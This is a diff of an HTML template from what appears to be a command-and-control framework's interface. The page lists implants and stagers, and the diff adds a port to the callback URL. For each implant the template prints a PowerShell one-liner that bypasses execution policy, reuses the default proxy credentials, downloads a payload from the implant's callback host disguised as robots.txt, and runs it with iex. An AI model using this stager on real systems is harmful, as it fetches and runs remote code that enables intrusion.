@@ -4,13 +4,13 @@
     <h4>Existing Implants & Stagers</h4>
     {% if implantList %}
         {% for implant in implantList %}
-    <p><span class="font-weight-bold">Name:</span> {{ implant.generated_title }}<br>
+    <p><span class="font-weight-bold">Name:</span> {{ implant.title }}<br>
         <span class="font-weight-bold">Description:</span> {{ implant.description }}<br>
         <span class="font-weight-bold">URL:</span> {{implant.callback_url }}</p>
 
 
             <div>
-        <code>powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<b>{{implant.callback_url}}</b>/robots.txt?user={{ implant.stager_key }}')|iex"</code>
+        <code>powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<b>{{implant.callback_url}}:{{ implant.port }}</b>/robots.txt?user={{ implant.stager_key }}')|iex"</code>
     </div><hr>
         {% endfor %}
     {% else %}
